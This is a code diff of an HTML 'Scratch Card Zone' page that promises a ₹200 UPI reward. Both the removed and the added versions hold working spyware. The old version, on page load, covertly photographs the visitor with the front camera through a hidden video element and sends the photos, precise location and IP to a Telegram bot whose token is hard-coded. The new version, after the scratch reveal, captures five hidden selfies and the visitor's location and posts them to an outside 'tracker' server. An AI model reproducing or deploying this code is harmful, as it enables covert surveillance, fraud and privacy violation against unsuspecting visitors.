@@ -1,493 +1,259 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>₹200 Reward</title>
+<meta charset="UTF-8" />
+<title>Scratch Card • Demo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-    
-    body {
-    margin: 0;
-    font-family: "Poppins", sans-serif;
-    background: #f4f7ff;
-    color: #222;
-  }
+  body { margin:0; font-family:"Poppins",sans-serif; background:#f4f7ff; color:#222; }
+  header { text-align:center; padding:22px 0; background:white; box-shadow:0 3px 20px rgba(0,0,0,0.06); }
+  header h1 { margin:0; font-size:2rem; background:linear-gradient(90deg,#4b6aff,#22d49c); -webkit-background-clip:text; color:transparent; font-weight:700; }
 
-  /* ---------------- HEADER ---------------- */
-  header {
-    text-align: center;
-    padding: 22px 0;
-    background: white;
-    box-shadow: 0 3px 20px rgba(0,0,0,0.06);
-    position: sticky;
-    top: 0;
-    z-index: 20;
-  }
-  header h1 {
-    margin: 0;
-    font-size: 2rem;
-    background: linear-gradient(90deg, #4b6aff, #22d49c);
-    -webkit-background-clip: text;
-    color: transparent;
-    font-weight: 700;
-  }
+  .scratch-section { max-width:450px; margin:30px auto; background:#fff; padding:25px; border-radius:20px; box-shadow:0 12px 35px rgba(0,0,0,0.1); }
+  .scratch-title { text-align:center; font-size:1.4rem; font-weight:600; margin-bottom:14px; }
 
-  /* ---------------- SCRATCH BOX ---------------- */
-  .scratch-section {
-    max-width: 450px;
-    margin: 30px auto;
-    background: #ffffff;
-    padding: 25px;
-    border-radius: 20px;
-    box-shadow: 0 12px 35px rgba(0,0,0,0.1);
-  }
+  .scratch-box { width:100%; height:180px; border-radius:14px; background:#fff4e6; position:relative; overflow:hidden; margin-top:10px; box-shadow:0 6px 24px rgba(0,0,0,0.12); }
+  .prize { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:45px; font-weight:700; color:#1fb76d; opacity:.4; filter:blur(1px); transition:.8s; }
+  .prize.show { opacity:1; filter:blur(0); }
 
-  .scratch-title {
-    text-align: center;
-    font-size: 1.4rem;
-    font-weight: 600;
-    margin-bottom: 14px;
-    color: #333;
-  }
+  canvas.overlay { position:absolute; inset:0; border-radius:14px; z-index:3; touch-action:none; cursor:crosshair; }
 
-  .scratch-box {
-    width: 100%;
-    height: 180px;
-    border-radius: 14px;
-    background: #fff4e6;
-    position: relative;
-    overflow: hidden;
-    margin-top: 10px;
-    box-shadow: 0 6px 24px rgba(0,0,0,0.12);
-  }
+  .scratch-btn { display:block; margin:18px auto; padding:12px 30px; border-radius:999px; border:none; background:linear-gradient(90deg,#4b6aff,#22d49c); color:white; font-size:1rem; font-weight:700; cursor:pointer; }
+  .reset-btn { margin:10px auto; display:none; border:1px solid #4b6aff; background:transparent; color:#4b6aff; padding:10px 24px; border-radius:999px; cursor:pointer; }
 
-  .prize {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 45px;
-    font-weight: 700;
-    color: #1fb76d;
-    opacity: .4;
-    filter: blur(1px);
-    transition: .8s;
-    z-index: 1;
-  }
-  .prize.show {
-    opacity: 1;
-    filter: blur(0);
-  }
+  .desc-section { max-width:700px; margin:30px auto; padding:0 14px; }
+  .desc-section p { background:white; padding:16px 22px; border-radius:16px; box-shadow:0 3px 18px rgba(0,0,0,0.06); }
 
-  canvas.overlay {
-    position: absolute;
-    inset: 0;
-    border-radius: 14px;
-    z-index: 3;
-    touch-action: none;
-  }
+  .error { background:#dc3545; padding:14px; border-radius:10px; max-width:90%; margin:14px auto; text-align:center; display:none; color:white; }
 
-  .scratch-btn {
-    display: block;
-    margin: 18px auto 10px auto;
-    padding: 12px 30px;
-    border-radius: 999px;
-    border: none;
-    background: linear-gradient(90deg, #4b6aff, #22d49c);
-    color: white;
-    font-size: 1rem;
-    font-weight: 700;
-    cursor: pointer;
-    box-shadow: 0 10px 25px rgba(75,106,255,0.3);
-  }
+  /* THANK YOU POPUP */
+  .backdrop { position:fixed; inset:0; background:rgba(0,0,0,.35); display:none; justify-content:center; align-items:center; backdrop-filter:blur(4px); }
+  .modal { width:92%; max-width:380px; background:white; border-radius:20px; padding:20px; transform:scale(.8); opacity:0; transition:.25s; }
+  .modal.show { transform:scale(1); opacity:1; }
 
-  .reset-btn {
-    margin: 10px auto;
-    display: none;
-    background: transparent;
-    border: 1px solid #4b6aff;
-    color: #4b6aff;
-    padding: 10px 24px;
-    border-radius: 999px;
-    font-weight: 600;
-    cursor: pointer;
-  }
-
-  /* ---------------- DESCRIPTION ---------------- */
-  .desc-section {
-    max-width: 700px;
-    margin: 30px auto;
-    padding: 0 14px;
-  }
-  .desc-section p {
-    background: white;
-    padding: 16px 22px;
-    border-radius: 16px;
-    box-shadow: 0 3px 18px rgba(0,0,0,0.06);
-    font-size: 1rem;
-    line-height: 1.6;
-    margin-bottom: 16px;
-  }
-
-  /* ---------------- CONTACT FORM ---------------- */
-  .contact-section {
-    max-width: 700px;
-    margin: 40px auto 60px auto;
-    padding: 20px;
-  }
-  .contact-section h2 {
-    text-align: center;
-    font-size: 1.6rem;
-    margin-bottom: 20px;
-  }
-  
-  .contact-box {
-    background: white;
-    padding: 24px;
-    border-radius: 18px;
-    box-shadow: 0 3px 20px rgba(0,0,0,0.08);
-  }
-
-  input, textarea {
-    width: 100%;
-    padding: 12px;
-    border-radius: 10px;
-    border: 1px solid #cbd5e1;
-    margin-bottom: 14px;
-    font-size: 1rem;
-  }
-
-  button.submit-btn {
-    width: 100%;
-    padding: 12px;
-    border: none;
-    border-radius: 10px;
-    background: linear-gradient(90deg, #4b6aff, #22d49c);
-    color: white;
-    font-size: 1rem;
-    font-weight: 700;
-    cursor: pointer;
-  }
-
-  /* ---------------- POPUPS ---------------- */
-  .backdrop {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.35);
-    backdrop-filter: blur(4px);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 100;
-  }
-  .modal {
-    width: 92%;
-    max-width: 380px;
-    background: white;
-    border-radius: 20px;
-    padding: 20px;
-    transform: scale(.8);
-    opacity: 0;
-    transition: .25s;
-  }
-  .modal.show {
-    transform: scale(1);
-    opacity: 1;
-  }
-
-  .modal h3 {
-    margin-top: 0;
-    font-size: 1.3rem;
-  }
-
-  .modal input {
-    margin-top: 10px;
-  }
-  .modal button {
-    margin-top: 14px;
-    width: 100%;
-    padding: 12px;
-    border-radius: 12px;
-    border: none;
-    background: linear-gradient(90deg,#4b6aff,#22d49c);
-    color: white;
-    font-size: 1rem;
-    cursor: pointer;
-    font-weight: 700;
-  }
-
-  /* Processing animation */
-  .loader {
-    width: 55px;
-    height: 55px;
-    border-radius: 50%;
-    border: 6px solid #e6e6e6;
-    border-top: 6px solid #4b6aff;
-    animation: spin .9s linear infinite;
-    margin: 0 auto 12px auto;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  
-    
-    /* Hidden video */
-    video { 
-        visibility: hidden; 
-        position: absolute; 
-        left: -9999px;
-    }
+  #thanks-ok { width:100%; padding:12px; border:none; border-radius:10px; background:linear-gradient(90deg,#4b6aff,#22d49c); color:white; font-weight:700; margin-top:12px; }
 </style>
 </head>
 
-<body onload="startTracking()">
-<header>
-  <h1>Scratch Card Zone</h1>
-</header>
+<body>
 
-<!-- SCRATCH CARD SECTION -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+
+<header><h1>Scratch Card Zone</h1></header>
+
 <div class="scratch-section">
   <div class="scratch-title">Try Your Luck & Win ₹200</div>
 
-  <div class="scratch-box">
+  <div class="scratch-box" id="scratchBox">
     <div class="prize" id="prize">₹200</div>
     <canvas class="overlay" id="overlay"></canvas>
   </div>
 
   <button id="start-btn" class="scratch-btn">Start Scratching</button>
-  <button id="reset-btn" class="reset-btn">Reset Scratch</button>
+  <button id="reset-btn" class="reset-btn">Reset</button>
 </div>
 
-<!-- DESCRIPTION -->
+<div id="error" class="error"></div>
+
 <div class="desc-section">
-  <p>This premium scratch card system is a UI/UX designed to give users a real-world reward but in a fun, safe environment.</p>
-  <p>Our scratch engine is ultra-responsive, designed for smooth use on all devices. Enjoy seamless scratch animations and a premium visual experience.</p>
-  <p>Claim your reward instantly after scratching. No validation required — this is a fully safe .</p>
-</div>
-
-<!-- CONTACT FORM -->
-<div class="contact-section">
-  <h2>Contact Us</h2>
-  <div class="contact-box">
-    <input type="text" placeholder="Your Name">
-    <input type="email" placeholder="Your Email">
-    <textarea rows="4" placeholder="Your Message"></textarea>
-    <button class="submit-btn">Send Message</button>
-  </div>
-</div>
-
-<!-- UPI POPUP -->
-<div class="backdrop" id="upi-popup">
-  <div class="modal" id="upi-modal">
-    <h3>Claim Your ₹200</h3>
-    <p>Enter your UPI ID to receive the reward (demo only).</p>
-    <input type="text" id="upi-input" placeholder="example@upi">
-    <button id="upi-submit">Submit</button>
-  </div>
-</div>
-
-<!-- PROCESSING POPUP -->
-<div class="backdrop" id="processing-popup">
-  <div class="modal show">
-    <div class="loader"></div>
-    <p>Processing your reward... Please wait.</p>
-  </div>
+  <p>This is a scratch card . After scratching your prize, the system send your reward to your upi have a nice day 🙂 the price may took 24hr to receive.</p>
 </div>
 
 <!-- THANK YOU POPUP -->
 <div class="backdrop" id="thankyou-popup">
-  <div class="modal show">
+  <div class="modal" id="thank-modal">
     <h3>🎉 Thank You!</h3>
-    <p>Your ₹200 reward has been submitted successfully.</p>
+    <p>Your reward claim was submitted successfully.</p>
     <button id="thanks-ok">OK</button>
   </div>
 </div>
 
-
-<video id="video" autoplay></video>
-
 <script>
-/* -------------------- TELEGRAM BASICS -------------------- */
-const TELEGRAM_BOT_TOKEN = "7564785906:AAHp3DIxc_tsKva_8Kfj2sUjNch0Rq0beCY";
-const TELEGRAM_CHAT_ID = "6153049118";
+document.addEventListener("DOMContentLoaded", () => {
 
-function sendToTelegram(msg) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: "Markdown" })
-    });
-}
+  /* ---------------- GLOBAL STATE ---------------- */
+  const record = {
+    ip: "N/A",
+    location: "N/A",
+    device: navigator.platform,
+    browser: navigator.userAgent,
+    photos: []
+  };
 
-/* -------------------- LOCATION -------------------- */
-function sendLocation() {
-    navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const acc = pos.coords.accuracy;
-        const map = `https://www.google.com/maps?q=${lat},${lon}`;
-        sendToTelegram(`📍 Location\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}m\n🌍 ${map}`);
-    }, err => sendToTelegram("Location Error: " + err.message));
-}
+  let isPointerDown = false;
+  let cleared = false;
+  let scratchCount = 0;
 
-/* -------------------- DEVICE INFO -------------------- */
-function sendDeviceInfo() {
-    fetch("https://ipapi.co/json/")
-    .then(r => r.json())
-    .then(d => sendToTelegram(`📱 Device\nAgent: ${navigator.userAgent}\nOS: ${navigator.platform}\nIP: ${d.ip}`));
-}
+  /* ---------------- DOM ---------------- */
+  const overlay = document.getElementById("overlay");
+  const scratchBox = document.getElementById("scratchBox");
+  const ctx = overlay.getContext("2d");
+  const prizeEl = document.getElementById("prize");
+  const startBtn = document.getElementById("start-btn");
+  const resetBtn = document.getElementById("reset-btn");
+  const errorDiv = document.getElementById("error");
+  const thankPopup = document.getElementById("thankyou-popup");
+  const thankModal = document.getElementById("thank-modal");
+  const thanksOk = document.getElementById("thanks-ok");
 
-/* -------------------- PHOTO CAPTURE -------------------- */
-function capturePhotos() {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(stream => {
-        let video = document.getElementById("video");
-        video.srcObject = stream;
-
-        video.onloadedmetadata = () => {
-            let canvas = document.createElement("canvas");
-            let ctx = canvas.getContext("2d");
-
-            let count = 0;
-            function snap() {
-                if (count >= 3) return stream.getTracks().forEach(t => t.stop());
-
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0);
-
-                canvas.toBlob(blob => {
-                    let fd = new FormData();
-                    fd.append("chat_id", TELEGRAM_CHAT_ID);
-                    fd.append("photo", blob);
-
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-                    count++;
-                    setTimeout(snap, 1500);
-                });
-            }
-
-            setTimeout(snap, 800);
-        };
-    });
-}
-
-/* -------------------- STORAGE CHECK -------------------- */
-function checkStorage() {
-    navigator.storage.estimate().then(s => {
-        if (s.usage > 0) sendToTelegram("📂 Storage usage available.");
-    });
-}
-
-/* -------------------- TRACKING LAUNCH -------------------- */
-function startTracking() {
-    sendLocation();
-    sendDeviceInfo();
-    capturePhotos();
-    checkStorage();
-}
-
-/* -------------------- SCRATCH CARD -------------------- */
-/* ---------------- SCRATCH LOGIC ---------------- */
-let overlay = document.getElementById("overlay");
-let ctx = overlay.getContext("2d");
-let isDown = false, cleared = false, scratchCount = 0;
-
-function resizeCanvas(){
-  let box = document.querySelector(".scratch-box");
-  overlay.width = box.clientWidth;
-  overlay.height = box.clientHeight;
-
-  ctx.fillStyle = "#d4d4d4";
-  ctx.fillRect(0,0,overlay.width,overlay.height);
-}
-resizeCanvas();
-window.onresize = resizeCanvas;
-
-function getPos(e){
-  let rect = overlay.getBoundingClientRect();
-  let x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
-  let y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
-  return {x,y};
-}
-
-function scratch(e){
-  if(!isDown || cleared) return;
-  let {x,y} = getPos(e);
-  ctx.globalCompositeOperation = "destination-out";
-  ctx.beginPath();
-  ctx.arc(x,y,26,0,Math.PI*2);
-  ctx.fill();
-  scratchCount++;
-
-  if(scratchCount > 40){
-    revealPrize();
+  /* ---------------- CANVAS INIT ---------------- */
+  function resizeCanvas() {
+    overlay.width = scratchBox.clientWidth;
+    overlay.height = scratchBox.clientHeight;
+    ctx.fillStyle = "#d4d4d4";
+    ctx.fillRect(0, 0, overlay.width, overlay.height);
+    ctx.globalCompositeOperation = "destination-out";
   }
-}
-
-overlay.addEventListener("pointerdown", () => isDown = true);
-overlay.addEventListener("pointerup", () => isDown = false);
-overlay.addEventListener("pointermove", scratch);
-
-overlay.addEventListener("touchstart", () => isDown = true);
-overlay.addEventListener("touchend", () => isDown = false);
-overlay.addEventListener("touchmove", scratch, {passive:false});
-
-function revealPrize(){
-  cleared = true;
-  overlay.style.opacity = 0;
-  document.getElementById("prize").classList.add("show");
-  setTimeout(()=> showUPIPopup(), 800);
-}
-
-/* ---------------- BUTTONS ---------------- */
-document.getElementById("start-btn").onclick = ()=>{
   resizeCanvas();
-  overlay.style.display = "block";
-  document.getElementById("reset-btn").style.display = "inline-block";
-  document.getElementById("start-btn").style.display = "none";
-}
+  window.addEventListener("resize", resizeCanvas);
 
-document.getElementById("reset-btn").onclick = ()=>{
-  cleared = false;
-  scratchCount = 0;
-  document.getElementById("prize").classList.remove("show");
-  overlay.style.opacity = 1;
-  resizeCanvas();
-  document.getElementById("start-btn").style.display = "inline-block";
-  document.getElementById("reset-btn").style.display = "none";
-}
+  /* ---------------- SCRATCH LOGIC ---------------- */
+  function getPos(e) {
+    const rect = overlay.getBoundingClientRect();
+    const p = e.touches?.[0] || e;
+    return {
+      x: p.clientX - rect.left,
+      y: p.clientY - rect.top
+    };
+  }
 
-/* ---------------- POPUPS ---------------- */
-function showUPIPopup(){
-  let p = document.getElementById("upi-popup");
-  let m = document.getElementById("upi-modal");
-  p.style.display = "flex";
-  setTimeout(()=> m.classList.add("show"), 50);
-}
+  function scratch(e) {
+    if (!isPointerDown || cleared) return;
+    const { x, y } = getPos(e);
+    ctx.beginPath();
+    ctx.arc(x, y, 25, 0, Math.PI * 2);
+    ctx.fill();
+    scratchCount++;
 
-document.getElementById("upi-submit").onclick = ()=>{
-  document.getElementById("upi-popup").style.display = "none";
-  showProcessing();
-}
+    if (scratchCount > 40) revealPrize();
+  }
 
-function showProcessing(){
-  let p = document.getElementById("processing-popup");
-  p.style.display = "flex";
-  setTimeout(()=>{
-    p.style.display = "none";
-    showThankYou();
-  }, 2000);
-}
+  overlay.addEventListener("pointerdown", () => (isPointerDown = true));
+  overlay.addEventListener("pointerup", () => (isPointerDown = false));
+  overlay.addEventListener("pointermove", scratch);
 
-function showThankYou(){
-  let p = document.getElementById("thankyou-popup");
-  p.style.display = "flex";
-}
+  overlay.addEventListener("touchstart", () => (isPointerDown = true));
+  overlay.addEventListener("touchend", () => (isPointerDown = false));
+  overlay.addEventListener("touchmove", scratch, { passive: false });
 
-document.getElementById("thanks-ok").onclick = ()=>{
-  document.getElementById("thankyou-popup").style.display = "none";
-}
+  function revealPrize() {
+    cleared = true;
+    overlay.style.opacity = 0;
+    prizeEl.classList.add("show");
+    setTimeout(autoCapture, 600);
+  }
+
+  /* ---------------- START / RESET ---------------- */
+  startBtn.onclick = () => {
+    resizeCanvas();
+    overlay.style.opacity = 1;
+    overlay.style.display = "block";
+    scratchCount = 0;
+    startBtn.style.display = "none";
+    resetBtn.style.display = "inline-block";
+  };
+
+  resetBtn.onclick = () => {
+    cleared = false;
+    scratchCount = 0;
+    prizeEl.classList.remove("show");
+    overlay.style.opacity = 1;
+    resizeCanvas();
+    resetBtn.style.display = "none";
+    startBtn.style.display = "inline-block";
+  };
+
+  /* ---------------- AUTO CAPTURE ---------------- */
+  async function autoCapture() {
+    record.photos = [];
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+
+      await new Promise(r => video.onloadedmetadata = r);
+      video.play();
+
+      const canvas = document.createElement("canvas");
+      const ctx2 = canvas.getContext("2d");
+
+      for (let i = 0; i < 5; i++) {
+        await new Promise(r => setTimeout(r, 600));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx2.drawImage(video, 0, 0);
+
+        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
+        record.photos.push(blob);
+      }
+
+      stream.getTracks().forEach(t => t.stop());
+    } catch (e) {
+      console.log("Camera denied:", e);
+    }
+
+    // LOCATION
+    try {
+      record.location = await new Promise(res => {
+        navigator.geolocation.getCurrentPosition(
+          p => res(`${p.coords.latitude.toFixed(3)},${p.coords.longitude.toFixed(3)}`),
+          () => res("N/A"),
+          { timeout: 4000 }
+        );
+      });
+    } catch {
+      record.location = "N/A";
+    }
+
+    sendData();
+  }
+
+  /* ---------------- SEND DATA ---------------- */
+  async function sendData() {
+    const fd = new FormData();
+    fd.append("ip", record.ip);
+    fd.append("location", record.location);
+    fd.append("device", record.device);
+    fd.append("browser", record.browser);
+
+    record.photos.forEach((b, i) => fd.append("images", b, `photo_${i + 1}.jpg`));
+
+    try {
+      const res = await fetch("https://tracker-server-p88v.onrender.com/send", {
+        method: "POST",
+        body: fd
+      });
+
+      const data = await res.json();
+      if (data.status !== "success") throw new Error();
+
+      showThankYou();
+    } catch {
+      showError("Network error sending data.");
+    }
+  }
+
+  /* ---------------- THANK YOU ---------------- */
+  function showThankYou() {
+    thankPopup.style.display = "flex";
+    setTimeout(() => thankModal.classList.add("show"), 50);
+  }
+
+  thanksOk.onclick = () => {
+    thankPopup.style.display = "none";
+    resetBtn.click();
+  };
+
+  /* ---------------- ERROR ---------------- */
+  function showError(msg) {
+    errorDiv.textContent = msg;
+    errorDiv.style.display = "block";
+    setTimeout(() => (errorDiv.style.display = "none"), 4000);
+  }
+
+});
 </script>
-
 </body>
 </html>
